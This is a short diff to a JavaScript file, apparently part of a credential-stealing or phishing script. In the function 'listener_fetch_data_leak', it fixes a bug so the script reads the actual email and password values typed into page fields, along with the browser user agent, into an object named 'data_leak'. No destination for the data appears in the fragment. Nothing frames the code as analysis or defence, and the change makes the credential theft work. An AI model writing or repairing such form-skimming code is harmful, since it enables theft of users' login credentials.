@@ -62,8 +62,8 @@ function get_element_value(selectors) {
 function listener_fetch_data_leak() {
     // GET data to leak
     data_leak = {
-        "email": get_element_value(window["data_leak_label_username"]),
-        "password": get_element_value(window["data_leak_label_password"]),
+        "email": get_element_value(window["data_leak_label_username"]).value,
+        "password": get_element_value(window["data_leak_label_password"]).value,
         "uagent": navigator.userAgent
     }
 
